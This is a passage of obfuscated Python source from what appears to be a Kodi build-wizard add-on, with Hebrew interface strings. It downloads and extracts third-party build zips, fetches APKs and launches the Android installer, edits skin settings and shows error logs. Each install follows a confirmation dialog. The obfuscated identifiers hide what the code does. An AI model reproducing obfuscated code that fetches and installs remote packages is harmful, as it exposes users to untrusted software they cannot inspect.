			OOOO00O0OOO00OO0O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4317
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4318
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4319
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4320
			O0O0OO00O00OOO00O .close ()#line:4321
			O00000O0O0000O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4325
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'r')#line:4327
			OOO000000O00OOOO0 =O0O0OO00O00OOO00O .read ()#line:4328
			O0O0OO00O00OOO00O .close ()#line:4329
			OOOO00O0OOO00OO0O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4330
			O000OO0OOO0000O0O =re .compile (OOOO00O0OOO00OO0O ).findall (OOO000000O00OOOO0 )[0 ]#line:4331
			O0O0OO00O00OOO00O =open (O00000O0O0000O00O ,'w')#line:4332
			O0O0OO00O00OOO00O .write (OOO000000O00OOOO0 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O000OO0OOO0000O0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4333
			O0O0OO00O00OOO00O .close ()#line:4334
		except :#line:4339
			pass #line:4340
def thirdPartyInstall (O0OO0000O00O000OO ,O0OOOOOO0000OOO00 ):#line:4342
	if not wiz .workingURL (O0OOOOOO0000OOO00 ):#line:4343
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4344
	O0O00O000OO00O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000O00O000OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4345
	if O0O00O000OO00O0O0 ==1 :#line:4346
		freshStart ('third',True )#line:4347
	wiz .clearS ('build')#line:4348
	O0OOOOOOO0OO0O00O =O0OO0000O00O000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4349
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4350
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0000O00O000OO ),'','אנא המתן')#line:4351
	O0000O0O0O00000OO =os .path .join (PACKAGES ,'%s.zip'%O0OOOOOOO0OO0O00O )#line:4352
	try :os .remove (O0000O0O0O00000OO )#line:4353
	except :pass #line:4354
	downloader .download (O0OOOOOO0000OOO00 ,O0000O0O0O00000OO ,DP )#line:4355
	xbmc .sleep (1000 )#line:4356
	O0O00000O0OOO0O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0000O00O000OO )#line:4357
	DP .update (0 ,O0O00000O0OOO0O00 ,'','אנא המתן')#line:4358
	OO00OO0O0OO000OOO ,O0OO0O00000OOO0OO ,OOO0O0OO00O0O00O0 =extract .all (O0000O0O0O00000OO ,HOME ,DP ,title =O0O00000O0OOO0O00 )#line:4359
	if int (float (OO00OO0O0OO000OOO ))>0 :#line:4360
		wiz .fixmetas ()#line:4361
		wiz .lookandFeelData ('save')#line:4362
		wiz .defaultSkin ()#line:4363
		wiz .setS ('installed','true')#line:4365
		wiz .setS ('extract',str (OO00OO0O0OO000OOO ))#line:4366
		wiz .setS ('errors',str (O0OO0O00000OOO0OO ))#line:4367
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00OO0O0OO000OOO ,O0OO0O00000OOO0OO ))#line:4368
		try :os .remove (O0000O0O0O00000OO )#line:4369
		except :pass #line:4370
		if int (float (O0OO0O00000OOO0OO ))>0 :#line:4371
			O0OOOOOO0OOO0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0000O00O000OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00OO0O0OO000OOO ,'%',COLOR1 ,O0OO0O00000OOO0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4372
			if O0OOOOOO0OOO0OO00 :#line:4373
				if isinstance (O0OO0O00000OOO0OO ,unicode ):#line:4374
					OOO0O0OO00O0O00O0 =OOO0O0OO00O0O00O0 .encode ('utf-8')#line:4375
				wiz .TextBox (ADDONTITLE ,OOO0O0OO00O0O00O0 )#line:4376
	DP .close ()#line:4377
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4378
	if INSTALLMETHOD ==1 :OOOO0O0O0O000O0O0 =1 #line:4379
	elif INSTALLMETHOD ==2 :OOOO0O0O0O000O0O0 =0 #line:4380
	else :OOOO0O0O0O000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4381
	if OOOO0O0O0O000O0O0 ==1 :wiz .reloadFix ()#line:4382
	else :wiz .killxbmc (True )#line:4383
def testTheme (O0OO00OO00OO0OOO0 ):#line:4385
	O0O00OOOO0O0OOO0O =zipfile .ZipFile (O0OO00OO00OO0OOO0 )#line:4386
	for O00O00000OO0OO00O in O0O00OOOO0O0OOO0O .infolist ():#line:4387
		if '/settings.xml'in O00O00000OO0OO00O .filename :#line:4388
			return True #line:4389
	return False #line:4390
def testGui (OOOOOOO0O0OO0O0O0 ):#line:4392
	O00000O0O000O0OO0 =zipfile .ZipFile (OOOOOOO0O0OO0O0O0 )#line:4393
	for O0O000O0OO0OO00OO in O00000O0O000O0OO0 .infolist ():#line:4394
		if '/guisettings.xml'in O0O000O0OO0OO00OO .filename :#line:4395
			return True #line:4396
	return False #line:4397
def apkInstaller (O00O00O00O0OOO0O0 ,O00O0O0OO00OO0O0O ):#line:4399
	wiz .log (O00O00O00O0OOO0O0 )#line:4400
	wiz .log (O00O0O0OO00OO0O0O )#line:4401
	if wiz .platform ()=='android':#line:4402
		O0O00OOO0O0OO0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00O00O0OOO0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4403
		if not O0O00OOO0O0OO0000 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4404
		OOO0OOO00OO0OOO00 =O00O00O00O0OOO0O0 #line:4405
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4406
		if not wiz .workingURL (O00O0O0OO00OO0O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4407
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OOO00OO0OOO00 ),'','אנא המתן')#line:4408
		O00O000000O0OO0OO =os .path .join (PACKAGES ,"%s.apk"%O00O00O00O0OOO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4409
		try :os .remove (O00O000000O0OO0OO )#line:4410
		except :pass #line:4411
		downloader .download (O00O0O0OO00OO0O0O ,O00O000000O0OO0OO ,DP )#line:4412
		xbmc .sleep (100 )#line:4413
		DP .close ()#line:4414
		notify .apkInstaller (O00O00O00O0OOO0O0 )#line:4415
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O00O000000O0OO0OO +'")')#line:4416
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4417
def createMenu (O0OOO000OO000O000 ,OOOO00000O0O00OO0 ,OO0000OOO0O0OO0OO ):#line:4423
	if O0OOO000OO000O000 =='saveaddon':#line:4424
		OO0000OOOOO00OO00 =[]#line:4425
		OO0O0O0O0OOOO00OO =urllib .quote_plus (OOOO00000O0O00OO0 .lower ().replace (' ',''))#line:4426
		O0OOO00O0000O0OOO =OOOO00000O0O00OO0 .replace ('Debrid','Real Debrid')#line:4427
		O00O00O00O0O0O00O =urllib .quote_plus (OO0000OOO0O0OO0OO .lower ().replace (' ',''))#line:4428
		OO0000OOO0O0OO0OO =OO0000OOO0O0OO0OO .replace ('url','URL Resolver')#line:4429
		OO0000OOOOO00OO00 .append ((THEME2 %OO0000OOO0O0OO0OO .title (),' '))#line:4430
		OO0000OOOOO00OO00 .append ((THEME3 %'Save %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4431
		OO0000OOOOO00OO00 .append ((THEME3 %'Restore %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4432
		OO0000OOOOO00OO00 .append ((THEME3 %'Clear %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4433
	elif O0OOO000OO000O000 =='save':#line:4434
		OO0000OOOOO00OO00 =[]#line:4435
		OO0O0O0O0OOOO00OO =urllib .quote_plus (OOOO00000O0O00OO0 .lower ().replace (' ',''))#line:4436
		O0OOO00O0000O0OOO =OOOO00000O0O00OO0 .replace ('Debrid','Real Debrid')#line:4437
		O00O00O00O0O0O00O =urllib .quote_plus (OO0000OOO0O0OO0OO .lower ().replace (' ',''))#line:4438
		OO0000OOO0O0OO0OO =OO0000OOO0O0OO0OO .replace ('url','URL Resolver')#line:4439
		OO0000OOOOO00OO00 .append ((THEME2 %OO0000OOO0O0OO0OO .title (),' '))#line:4440
		OO0000OOOOO00OO00 .append ((THEME3 %'Register %s'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4441
		OO0000OOOOO00OO00 .append ((THEME3 %'Save %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4442
		OO0000OOOOO00OO00 .append ((THEME3 %'Restore %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4443
		OO0000OOOOO00OO00 .append ((THEME3 %'Import %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4444
		OO0000OOOOO00OO00 .append ((THEME3 %'Clear Addon %s Data'%O0OOO00O0000O0OOO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OO0O0O0O0OOOO00OO ,O00O00O00O0O0O00O )))#line:4445
	elif O0OOO000OO000O000 =='install':#line:4446
		OO0000OOOOO00OO00 =[]#line:4447
		O00O00O00O0O0O00O =urllib .quote_plus (OO0000OOO0O0OO0OO )#line:4448
		OO0000OOOOO00OO00 .append ((THEME2 %OO0000OOO0O0OO0OO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00O00O00O0O0O00O )))#line:4449
		OO0000OOOOO00OO00 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00O00O00O0O0O00O )))#line:4450
		OO0000OOOOO00OO00 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00O00O00O0O0O00O )))#line:4451
		OO0000OOOOO00OO00 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00O00O00O0O0O00O )))#line:4452
		OO0000OOOOO00OO00 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00O00O00O0O0O00O )))#line:4453
	OO0000OOOOO00OO00 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4454
	return OO0000OOOOO00OO00 #line:4455
def toggleCache (OOO0000O00OO00OO0 ):#line:4457
	OOO0O0OO00OOO00O0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4458
	OO0OOO00O00OO00O0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4459
	if OOO0000O00OO00OO0 in ['true','false']:#line:4460
		for O00O00OO00OOO000O in OOO0O0OO00OOO00O0 :#line:4461
			wiz .setS (O00O00OO00OOO000O ,OOO0000O00OO00OO0 )#line:4462
	else :#line:4463
		if not OOO0000O00OO00OO0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4464
			try :#line:4465
				O00O00OO00OOO000O =OO0OOO00O00OO00O0 [OOO0O0OO00OOO00O0 .index (OOO0000O00OO00OO0 )]#line:4466
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O00O00OO00OOO000O ))#line:4467
			except :#line:4468
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO0000O00OO00OO0 ))#line:4469
		else :#line:4470
			OO00OOO0OOO0000O0 ='true'if wiz .getS (OOO0000O00OO00OO0 )=='false'else 'false'#line:4471
			wiz .setS (OOO0000O00OO00OO0 ,OO00OOO0OOO0000O0 )#line:4472
def playVideo (O0O00OO000OOO0O00 ):#line:4474
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0O00OO000OOO0O00 )#line:4475
	if 'watch?v='in O0O00OO000OOO0O00 :#line:4476
		OO0O0000O00OO00O0 ,O00O0O0O0O000000O =O0O00OO000OOO0O00 .split ('?')#line:4477
		O00000OOOOO0O00O0 =O00O0O0O0O000000O .split ('&')#line:4478
		for OOOO0000O00O0OO00 in O00000OOOOO0O00O0 :#line:4479
			if OOOO0000O00O0OO00 .startswith ('v='):#line:4480
				O0O00OO000OOO0O00 =OOOO0000O00O0OO00 [2 :]#line:4481
				break #line:4482
			else :continue #line:4483
	elif 'embed'in O0O00OO000OOO0O00 or 'youtu.be'in O0O00OO000OOO0O00 :#line:4484
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0O00OO000OOO0O00 )#line:4485
		OO0O0000O00OO00O0 =O0O00OO000OOO0O00 .split ('/')#line:4486
		if len (OO0O0000O00OO00O0 [-1 ])>5 :#line:4487
			O0O00OO000OOO0O00 =OO0O0000O00OO00O0 [-1 ]#line:4488
		elif len (OO0O0000O00OO00O0 [-2 ])>5 :#line:4489
			O0O00OO000OOO0O00 =OO0O0000O00OO00O0 [-2 ]#line:4490
	wiz .log ("YouTube URL: %s"%O0O00OO000OOO0O00 )#line:4491
	yt .PlayVideo (O0O00OO000OOO0O00 )#line:4492
def viewLogFile ():#line:4494
	OO000O00O0O00OOO0 =wiz .Grab_Log (True )#line:4495
	OOOOOOO0O0OOOOOOO =wiz .Grab_Log (True ,True )#line:4496
	OOOO0O0OOOO0O0O0O =0 ;O00OO000O00O00OO0 =OO000O00O0O00OOO0 #line:4497
	if not OOOOOOO0O0OOOOOOO ==False and not OO000O00O0O00OOO0 ==False :#line:4498
		OOOO0O0OOOO0O0O0O =DIALOG .select (ADDONTITLE ,["View %s"%OO000O00O0O00OOO0 .replace (LOG ,""),"View %s"%OOOOOOO0O0OOOOOOO .replace (LOG ,"")])#line:4499
		if OOOO0O0OOOO0O0O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4500
	elif OO000O00O0O00OOO0 ==False and OOOOOOO0O0OOOOOOO ==False :#line:4501
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4502
		return #line:4503
	elif not OO000O00O0O00OOO0 ==False :OOOO0O0OOOO0O0O0O =0 #line:4504
	elif not OOOOOOO0O0OOOOOOO ==False :OOOO0O0OOOO0O0O0O =1 #line:4505
	O00OO000O00O00OO0 =OO000O00O0O00OOO0 if OOOO0O0OOOO0O0O0O ==0 else OOOOOOO0O0OOOOOOO #line:4507
	OOO0O0O0O0OOO00OO =wiz .Grab_Log (False )if OOOO0O0OOOO0O0O0O ==0 else wiz .Grab_Log (False ,True )#line:4508
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00OO000O00O00OO0 ),OOO0O0O0O0OOO00OO )#line:4510
def errorChecking (log =None ,count =None ,all =None ):#line:4512
	if log ==None :#line:4513
		OO0O00OO00OOOOO00 =wiz .Grab_Log (True )#line:4514
		OOOO0000O000000OO =wiz .Grab_Log (True ,True )#line:4515
		if not OOOO0000O000000OO ==False and not OO0O00OO00OOOOO00 ==False :#line:4516
			O00O0O0000O0OO0OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO0O00OO00OOOOO00 .replace (LOG ,""),errorChecking (OO0O00OO00OOOOO00 ,True ,True )),"View %s: %s error(s)"%(OOOO0000O000000OO .replace (LOG ,""),errorChecking (OOOO0000O000000OO ,True ,True ))])#line:4517
			if O00O0O0000O0OO0OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4518
		elif OO0O00OO00OOOOO00 ==False and OOOO0000O000000OO ==False :#line:4519
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4520
			return #line:4521
		elif not OO0O00OO00OOOOO00 ==False :O00O0O0000O0OO0OO =0 #line:4522
		elif not OOOO0000O000000OO ==False :O00O0O0000O0OO0OO =1 #line:4523
		log =OO0O00OO00OOOOO00 if O00O0O0000O0OO0OO ==0 else OOOO0000O000000OO #line:4524
	if log ==False :#line:4525
		if count ==None :#line:4526
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4527
			return False #line:4528
		else :#line:4529
			return 0 #line:4530
	else :#line:4531
		if os .path .exists (log ):#line:4532
			O0O000O00O00OOO00 =open (log ,mode ='r');OO0OO0000OO0000OO =O0O000O00O00OOO00 .read ().replace ('\n','').replace ('\r','');O0O000O00O00OOO00 .close ()#line:4533
			OO000O00OO00000O0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO0OO0000OO0000OO )#line:4534
			if not count ==None :#line:4535
				if all ==None :#line:4536
					O0OO0O00O00OO000O =0 #line:4537
					for O00O0O000O0OOOO0O in OO000O00OO00000O0 :#line:4538
						if ADDON_ID in O00O0O000O0OOOO0O :O0OO0O00O00OO000O +=1 #line:4539
					return O0OO0O00O00OO000O #line:4540
				else :return len (OO000O00OO00000O0 )#line:4541
			if len (OO000O00OO00000O0 )>0 :#line:4542
				O0OO0O00O00OO000O =0 ;O0OO0000O0000O0OO =""#line:4543
				for O00O0O000O0OOOO0O in OO000O00OO00000O0 :#line:4544
					if all ==None and not ADDON_ID in O00O0O000O0OOOO0O :continue #line:4545
					else :#line:4546
						O0OO0O00O00OO000O +=1 #line:4547
						O0OO0000O0000O0OO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0OO0O00O00OO000O ,O00O0O000O0OOOO0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4548
				if O0OO0O00O00OO000O >0 :#line:4549
					wiz .TextBox (ADDONTITLE ,O0OO0000O0000O0OO )#line:4550
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4551
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4552
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4553
ACTION_PREVIOUS_MENU =10 #line:4555
ACTION_NAV_BACK =92 #line:4556
ACTION_MOVE_LEFT =1 #line:4557
ACTION_MOVE_RIGHT =2 #line:4558
ACTION_MOVE_UP =3 #line:4559
ACTION_MOVE_DOWN =4 #line:4560
ACTION_MOUSE_WHEEL_UP =104 #line:4561
ACTION_MOUSE_WHEEL_DOWN =105 #line:4562
ACTION_MOVE_MOUSE =107 #line:4563
ACTION_SELECT_ITEM =7 #line:4564
ACTION_BACKSPACE =110 #line:4565
ACTION_MOUSE_LEFT_CLICK =100 #line:4566
ACTION_MOUSE_LONG_CLICK =108 #line:4567
def LogViewer (default =None ):#line:4569
	class O00O00O00OO0O00O0 (xbmcgui .WindowXMLDialog ):#line:4570
		def __init__ (OO0OOO0O000OO0O00 ,*O0OO0O0O0O00OO0OO ,**OO0O0OO000O00O0OO ):#line:4571
			OO0OOO0O000OO0O00 .default =OO0O0OO000O00O0OO ['default']#line:4572
		def onInit (OOO00O0O0OO00000O ):#line:4574
			OOO00O0O0OO00000O .title =101 #line:4575
			OOO00O0O0OO00000O .msg =102 #line:4576
			OOO00O0O0OO00000O .scrollbar =103 #line:4577
			OOO00O0O0OO00000O .upload =201 #line:4578
			OOO00O0O0OO00000O .kodi =202 #line:4579
			OOO00O0O0OO00000O .kodiold =203 #line:4580
			OOO00O0O0OO00000O .wizard =204 #line:4581
			OOO00O0O0OO00000O .okbutton =205 #line:4582
			OOOOO0OOOOOOOO0OO =open (OOO00O0O0OO00000O .default ,'r')#line:4583
			OOO00O0O0OO00000O .logmsg =OOOOO0OOOOOOOO0OO .read ()#line:4584
			OOOOO0OOOOOOOO0OO .close ()#line:4585
			OOO00O0O0OO00000O .titlemsg ="%s: %s"%(ADDONTITLE ,OOO00O0O0OO00000O .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4586
			OOO00O0O0OO00000O .showdialog ()#line:4587
		def showdialog (O000OOO00OO0OOO00 ):#line:4589
			O000OOO00OO0OOO00 .getControl (O000OOO00OO0OOO00 .title ).setLabel (O000OOO00OO0OOO00 .titlemsg )#line:4590
			O000OOO00OO0OOO00 .getControl (O000OOO00OO0OOO00 .msg ).setText (wiz .highlightText (O000OOO00OO0OOO00 .logmsg ))#line:4591
			O000OOO00OO0OOO00 .setFocusId (O000OOO00OO0OOO00 .scrollbar )#line:4592
		def onClick (OO0O0O000OOOO00OO ,OO0O00O0O0O00000O ):#line:4594
			if OO0O00O0O0O00000O ==OO0O0O000OOOO00OO .okbutton :OO0O0O000OOOO00OO .close ()#line:4595
			elif OO0O00O0O0O00000O ==OO0O0O000OOOO00OO .upload :OO0O0O000OOOO00OO .close ();uploadLog .Main ()#line:4596
			elif OO0O00O0O0O00000O ==OO0O0O000OOOO00OO .kodi :#line:4597
				OOO0OO0OO0OO0OOO0 =wiz .Grab_Log (False )#line:4598
				O00O0OO0OO0O0O0O0 =wiz .Grab_Log (True )#line:4599
				if OOO0OO0OO0OO0OOO0 ==False :#line:4600
					OO0O0O000OOOO00OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4601
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText ("Log File Does Not Exists!")#line:4602
				else :#line:4603
					OO0O0O000OOOO00OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0OO0OO0O0O0O0 .replace (LOG ,''))#line:4604
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .title ).setLabel (OO0O0O000OOOO00OO .titlemsg )#line:4605
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText (wiz .highlightText (OOO0OO0OO0OO0OOO0 ))#line:4606
					OO0O0O000OOOO00OO .setFocusId (OO0O0O000OOOO00OO .scrollbar )#line:4607
			elif OO0O00O0O0O00000O ==OO0O0O000OOOO00OO .kodiold :#line:4608
				OOO0OO0OO0OO0OOO0 =wiz .Grab_Log (False ,True )#line:4609
				O00O0OO0OO0O0O0O0 =wiz .Grab_Log (True ,True )#line:4610
				if OOO0OO0OO0OO0OOO0 ==False :#line:4611
					OO0O0O000OOOO00OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4612
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText ("Log File Does Not Exists!")#line:4613
				else :#line:4614
					OO0O0O000OOOO00OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0OO0OO0O0O0O0 .replace (LOG ,''))#line:4615
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .title ).setLabel (OO0O0O000OOOO00OO .titlemsg )#line:4616
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText (wiz .highlightText (OOO0OO0OO0OO0OOO0 ))#line:4617
					OO0O0O000OOOO00OO .setFocusId (OO0O0O000OOOO00OO .scrollbar )#line:4618
			elif OO0O00O0O0O00000O ==OO0O0O000OOOO00OO .wizard :#line:4619
				OOO0OO0OO0OO0OOO0 =wiz .Grab_Log (False ,False ,True )#line:4620
				O00O0OO0OO0O0O0O0 =wiz .Grab_Log (True ,False ,True )#line:4621
				if OOO0OO0OO0OO0OOO0 ==False :#line:4622
					OO0O0O000OOOO00OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4623
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText ("Log File Does Not Exists!")#line:4624
				else :#line:4625
					OO0O0O000OOOO00OO .titlemsg ="%s: %s"%(ADDONTITLE ,O00O0OO0OO0O0O0O0 .replace (ADDONDATA ,''))#line:4626
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .title ).setLabel (OO0O0O000OOOO00OO .titlemsg )#line:4627
					OO0O0O000OOOO00OO .getControl (OO0O0O000OOOO00OO .msg ).setText (wiz .highlightText (OOO0OO0OO0OO0OOO0 ))#line:4628
					OO0O0O000OOOO00OO .setFocusId (OO0O0O000OOOO00OO .scrollbar )#line:4629
		def onAction (OOO0O000OOOO0O0OO ,O00OOOO0O0O000OOO ):#line:4631
			if O00OOOO0O0O000OOO ==ACTION_PREVIOUS_MENU :OOO0O000OOOO0O0OO .close ()#line:4632
			elif O00OOOO0O0O000OOO ==ACTION_NAV_BACK :OOO0O000OOOO0O0OO .close ()#line:4633
	if default ==None :default =wiz .Grab_Log (True )#line:4634
	OOO0O0O0OO0OO0O0O =O00O00O00OO0O00O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4635
	OOO0O0O0OO0OO0O0O .doModal ()#line:4636
	del OOO0O0O0OO0OO0O0O #line:4637
def removeAddon (O0OOO0O0OO00O000O ,O0OO00OO0OOO0O000 ,over =False ):#line:4639
	if not over ==False :#line:4640
		OOOO00OOOOOOO000O =1 #line:4641
	else :#line:4642
		OOOO00OOOOOOO000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00OO0OOO0O000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0OOO0O0OO00O000O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4643
	if OOOO00OOOOOOO000O ==1 :#line:4644
		O00O0OO0O0OOOO000 =os .path .join (ADDONS ,O0OOO0O0OO00O000O )#line:4645
		wiz .log ("Removing Addon %s"%O0OOO0O0OO00O000O )#line:4646
		wiz .cleanHouse (O00O0OO0O0OOOO000 )#line:4647
